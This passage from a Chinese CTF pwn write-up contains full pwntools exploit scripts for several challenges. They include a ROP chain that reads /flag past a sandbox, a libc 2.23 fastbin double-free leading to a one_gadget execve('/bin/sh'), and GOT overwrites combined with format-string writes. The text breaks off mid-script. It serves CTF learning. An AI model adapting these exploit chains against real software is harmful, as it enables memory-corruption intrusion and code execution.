class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment"># payload += p64(elf.sym[&#x27;main&#x27;])</span></span><br><span class="line">    sla(<span class="string">b&#x27;Let me see see your rop skill\n&#x27;</span>,payload) </span><br><span class="line"></span><br><span class="line">    sl(<span class="string">b&#x27;/flag\x00&#x27;</span>) </span><br></pre></td></tr></table></figure>

<p>去试一下srop吧</p>
<p>不行，有沙箱，srop调用不了</p>
<p>想mprotect走shellcode结果发现mprotect会调用syscall 10来mprotect</p>
<p>还是决定再用最开始的思路，用ROPgadget深度搜索找到这样一条gadget</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn1 --depth 20 |grep ret | grep &#x27;mov rdi, rax&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0x0000000000480192 : mov rdi, rax ; cmp rdx, rcx ; jae 0x48017c ; mov rax, r8 ; ret</span></span><br></pre></td></tr></table></figure>

<p>如果rdx&lt;rcx不跳转，rdx可控，rcx在rop构造前是个比较大的值，因此可以用</p>
<p>即使不可以用也可以通过pop rcx ret来构造</p>
<p>但是。。。才发现标准输出流和标准错误流都给close掉了。。。。</p>
<p>不过代码里有个这个复制标准输出流的操作</p>
<p>但是。。。每次文件描述符不固定</p>
<p>于是考虑从3开始爆破</p>
<p>但是。。。只能写入0x400大小</p>
<p>没事，反正都爆破了，干脆整个程序都循环爆破，整个程序大循环，当输出flag时停止，</p>
<p>payload小循环，从3开始能遍历到0x14</p>
<p>（考虑到想小循环里多遍历几个文件描述符，于是避免使用write plt，因为每次该函数末尾会修改rdx值，使用sys可以少写一两个8字节）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    bss = <span class="number">0x4C82C0</span>+<span class="number">0x1000</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + <span class="string">b&#x27;deadbeef&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line">    environ = elf.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">    pop_rax_ret = <span class="number">0x00000000004487a7</span></span><br><span class="line">    syscall_ret = <span class="number">0x414f46</span></span><br><span class="line">    pop_rdi_ret = <span class="number">0x00000000004021cf</span></span><br><span class="line">    pop_rsi_ret = <span class="number">0x000000000040a23e</span></span><br><span class="line">    pop_rdx_rbx_ret = <span class="number">0x000000000047fbab</span></span><br><span class="line">    <span class="comment"># 0x0000000000480192 : mov rdi, rax ; cmp rdx, rcx ; jae 0x48017c ; mov rax, r8 ; ret</span></span><br><span class="line">    mov_rdi_rax_ret = <span class="number">0x0000000000480192</span></span><br><span class="line">    read_plt = elf.sym[<span class="string">&#x27;__libc_read&#x27;</span>]</span><br><span class="line">    payload += \</span><br><span class="line">        p64(pop_rdi_ret) +  p64(<span class="number">0</span>)+p64(pop_rsi_ret)+p64(bss) + p64(pop_rdx_rbx_ret)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read_plt)+\</span><br><span class="line">        p64(pop_rdi_ret) + p64(bss) +p64(pop_rsi_ret)+p64(<span class="number">0</span>)+ p64(pop_rdx_rbx_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall_ret)+\</span><br><span class="line">        p64(mov_rdi_rax_ret) +p64(pop_rsi_ret)+p64(bss+<span class="number">8</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">0</span>)+p64(syscall_ret)+\</span><br><span class="line">        p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(bss+<span class="number">8</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>,<span class="number">0x80</span>):</span><br><span class="line">        gadget = p64(pop_rdi_ret)+p64(i)+p64(pop_rax_ret)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(payload + gadget) &gt;= <span class="number">0x400</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload += gadget</span><br><span class="line">    <span class="comment"># payload += p64(elf.sym[&#x27;main&#x27;])</span></span><br><span class="line">    sla(<span class="string">b&#x27;Let me see see your rop skill\n&#x27;</span>,payload) </span><br><span class="line"></span><br><span class="line">    sl(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + ru(<span class="string">b&#x27;&#125;&#x27;</span>)+<span class="string">b&#x27;&#125;\n&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">args</span>):</span><br><span class="line">    ......</span><br><span class="line">    exp()</span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn(args)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">            <span class="comment"># log.error(f&quot;利用失败: &#123;e&#125;&quot;)</span></span><br><span class="line">            do_nothing = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="old-wine"><a href="#old-wine" class="headerlink" title="old wine"></a>old wine</h3><p>题目介绍：</p>
<p>题如其名，libc使用的是老版本2.23的菜单题目，提供了show，add和remove方法，</p>
<p>漏洞点：</p>
<p>一字节溢出</p>
<p><img src="/1763435254333-1.png" alt="img"></p>
<p>任意地址读：</p>
<p>由于可以控制异或结果控制chunk addr的最后一位，可以手动构造double free，double free之后将fake chunk劫持到 user list 中，然后修改user list中的chunk addr为got表地址，可以泄露libc地址， 再泄露一次enviorn地址， 因为还是栈上面数据多，这里限制了chunk size的大小，栈上面有0x40开头的函数地址 （当然可以再劫持到heap上修改chunk size 改malloc free hook）</p>
<p>“任意”地址写</p>
<p>任意地址写还是依靠 double free + fastbin attack 来写，这个写有chunk size的限制</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc-dir/libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    add(<span class="string">b&#x27;double1\n&#x27;</span>,<span class="string">b&#x27;\x60&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;double2\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># 为了避开double free的add</span></span><br><span class="line">    add(<span class="string">b&#x27;protect\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk4\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;barrier\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    remove(<span class="number">0</span>,<span class="string">b&#x27;\x60&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    remove(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># free 是 got表第一个</span></span><br><span class="line">    free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    <span class="comment"># 这个地址是使得fakechunk size等于0x60的</span></span><br><span class="line">    add(<span class="string">b&#x27;double3\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,p64(<span class="number">0x602057</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># \x60用来构造double free的fake chunk的size</span></span><br><span class="line">    key = add(<span class="string">b&#x27;protect\x61&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;double4\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;free_go\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">80</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1</span>+p64(free_got)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    show(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;[data]: &#x27;</span>)</span><br><span class="line">    libc.address = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))- libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line">    malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">    free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">    environ = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">    remove(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="string">b&#x27;double3\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,p64(<span class="number">0x602057</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk4&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;double4\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;free_got&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1</span>+p64(environ)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    show(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;[data]: &#x27;</span>)</span><br><span class="line">    stack_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">    leak(<span class="string">&#x27;environ_addr&#x27;</span>,environ)</span><br><span class="line">    leak(<span class="string">&#x27;stack_addr&#x27;</span>,stack_addr)</span><br><span class="line">    ret_addr_of_main = stack_addr - <span class="number">0xf0</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &gt; one_gadget ./libc-dir/libc.so.6 </span></span><br><span class="line"><span class="string">    0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    one_gadgets = [<span class="number">0x4527a</span>]</span><br><span class="line">    one_gadget = libc.address + one_gadgets[<span class="number">0</span>]</span><br><span class="line">    add(<span class="string">b&#x27;chunk7\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk8\n&#x27;</span>,<span class="string">b&#x27;\x40&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk9\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk10\n&#x27;</span>,<span class="string">b&#x27;\xc0&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    remove(<span class="number">8</span>,<span class="string">b&#x27;\x40&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk77\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,p64(ret_addr_of_main+<span class="number">0x30</span>-<span class="number">0x16</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk88\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk99\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">b&#x27;chunk4\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    remove(<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    remove(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk1\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,p64(ret_addr_of_main-<span class="number">0x26</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk2\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk3\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="string">b&#x27;chunk4\n&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x16</span>+p64(one_gadget)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Write-at-will"><a href="#Write-at-will" class="headerlink" title="Write at will"></a>Write at will</h3><p>题目介绍：</p>
<p>64位程序提供低32位地址任意读写功能</p>
<p>没有开启pie，因此libc、栈地址不可读写，got表可写，不是堆题</p>
<p>难点</p>
<p>①没想到atoi换成printf构造格式化字符串漏洞的思路</p>
<p>②libc_start_main调用main时候rbp是1，不好利用格式化字符串任意地址写</p>
<p>③orw沙箱导致printf参数大于40会触发orw以外的系统调用程序崩溃</p>
<p>④修改exit和stack chk fail的got表后，call这两个函数的压栈行为和其他压弹栈行为会造成printf和scanf栈对齐检测失败</p>
<p>⑤stevbuf和prctl再次调用会导致程序崩溃</p>
<p>思路</p>
<p>①泄露信息：利用题目原本的write方法泄露got上libc基址</p>
<p>②第一次修改got表——绕过操作次数限制：read方法修改exit got表为平衡栈的指令，修改stack chk fail的got为main函数的for循环的开始位置以能够继续修改stevbuf和prctl的got，为下一步做铺垫</p>
<p>③第二次修改got表——构造栈中的rbp：再次修改exit got为另一个合适的平衡栈的指令，stack chk fail为main的起始地址，以压一个rbp进栈构造格式化字符串漏洞任意地址写</p>
<p>④循环向新的rbp+8及其后的位置写入rop链调用openat read write 读出flag</p>
<p>吐槽</p>
<p>任意读写</p>
<p>但是输入的地址会被cdqe符号拓展，0x7fffffff以上的地址操作不了</p>
<p>思路就是将atoi got改为printf构造格式化字符串漏洞</p>
<p>这里的rbp为什么会是1，影响我格式化字符串了，但是没关系，还有其他办法</p>
<p>无语，printf使用%40$p往上的数字时好像会触发什么系统调用，</p>
<p>没关系我还有办法，直接用靶机的</p>
<p>原来rbp是1不是我的问题，远程靶机上也是1</p>
<p><img src="/1763435254333-2.png" alt="img"></p>
<p>思考过程</p>
<p>想自己找个rbp压进去，想到劫持控制流到main函数头，</p>
<p>但是不能每次都压rbp再抬栈，因为这样的话栈一直在抬高，当执行main函数的ret指令的时候栈的位置不好控制（写rop肯定是在main ret的栈写，是固定值，而栈一直抬高最后ret指令的栈顶已经不是这个位置了）</p>
<p>总之就是先第一次劫持控制流到main开始，第二次劫持到for循环开始就可以</p>
<p>注意到在main函数ret之前，有call exit和call stack chk fail，可以篡改这两个的got表</p>
<p>但是直接改call exit为main 起始地址的话是可以的，但是改为for的起始位置就不行了，由于call会压下一条指令进栈，导致printf和scanf的栈地址参数对不齐，于是两次分别将call exit改为call ret和call ret8来平衡栈，而且setvbuf和prctl再次执行时也会报错，也都用openat函数替换掉</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">menu_begining = <span class="string">b&#x27;3. Exit\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_into_address</span>(<span class="params">address,content</span>):</span><br><span class="line">    sla(menu_begining, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;where u want to get?\n&#x27;</span>, <span class="built_in">str</span>(address))</span><br><span class="line">    s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_format</span>(<span class="params"><span class="built_in">format</span></span>):</span><br><span class="line">    sla(menu_begining, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;where u want to get?\n&#x27;</span>, <span class="built_in">format</span>)</span><br><span class="line">    s(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">address</span>):</span><br><span class="line">    sla(menu_begining, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;where u want to get?\n&#x27;</span>,<span class="built_in">str</span>(address))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_attack</span>(<span class="params">target,value,offset1,offset2</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">format</span> = <span class="string">f&#x27;%<span class="subst">&#123;( target  &amp; <span class="number">0xffff</span>)&#125;</span>c%<span class="subst">&#123;offset1&#125;</span>$hn&#x27;</span>.encode()</span><br><span class="line">        read_format(<span class="built_in">format</span>)</span><br><span class="line">        <span class="keyword">if</span> value!=<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">format</span> =<span class="string">f&#x27;%<span class="subst">&#123;(value &amp; <span class="number">0xffff</span>)&#125;</span>c%<span class="subst">&#123;offset2&#125;</span>$hn&#x27;</span>.encode()<span class="comment">#+b&#x27;%&#123;&#125;c%9$hhn&#x27;.format(value &amp; 0xff)</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="built_in">format</span> =<span class="string">f&#x27;%22$hn&#x27;</span>.encode()</span><br><span class="line">        read_format(<span class="built_in">format</span>)</span><br><span class="line">        </span><br><span class="line">        value &gt;&gt;= <span class="number">16</span></span><br><span class="line">        target += <span class="number">2</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    write(puts_got)</span><br><span class="line">    <span class="comment"># ru()</span></span><br><span class="line">    got_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">    leak(<span class="string">&#x27;puts_got&#x27;</span>, got_addr)</span><br><span class="line">    <span class="comment"># return</span></span><br><span class="line">    libc.address = got_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    atoi_got = elf.got[<span 